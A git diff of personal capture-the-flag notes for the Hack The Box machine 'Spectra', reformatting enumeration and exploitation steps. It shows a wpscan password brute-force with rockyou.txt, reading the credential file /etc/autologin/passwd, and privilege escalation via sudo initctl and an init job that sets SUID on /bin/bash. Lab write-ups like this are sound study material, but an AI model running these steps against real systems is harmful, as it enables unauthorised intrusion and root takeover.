@@ -1,6 +1,6 @@
 # Spectra
 
-/etc/hosts spectra.htb
+> /etc/hosts spectra.htb
 
 **Port 80** 
 
@@ -21,9 +21,12 @@ wpscan --url http://spectra.htb/main --passwords ~/Downloads/rockyou.txt --usern
 ``` bash
 wfuzz -c -z file,/opt/node-dirbuster/lists/directory-list-2.3-medium.txt --hc 404 http://spectra.htb/FUZZ
 ```
+
+> USERS
+```
 user : user (wp)
 user: user (db)
-
+```
 
 ### dir
 
@@ -56,7 +59,7 @@ xmlrpc.php
 
 **PORT 22** 
 
-failed access with users
+> failed access with users
 
 
 **PORT 3306** 
@@ -108,18 +111,21 @@ Have fun and send patches!
 
 **LinPeas**
 
-bash-4.3$ cat /etc/autologin/passwd
+```bash
 cat /etc/autologin/passwd
-user:user
+```
 
-grupos? 
-sudo?
+1. user:user
+2. grupos? 
+3. sudo?
+4. NOPASSWD(initctl)
 
-NOPASSWD(initctl)
-
+```bash
 sudo -u root /sbin/initctl list
-
 vim /etc/init/test.conf 
 script 
 	chmod +s /bin/bash
 end script
+```
+
+
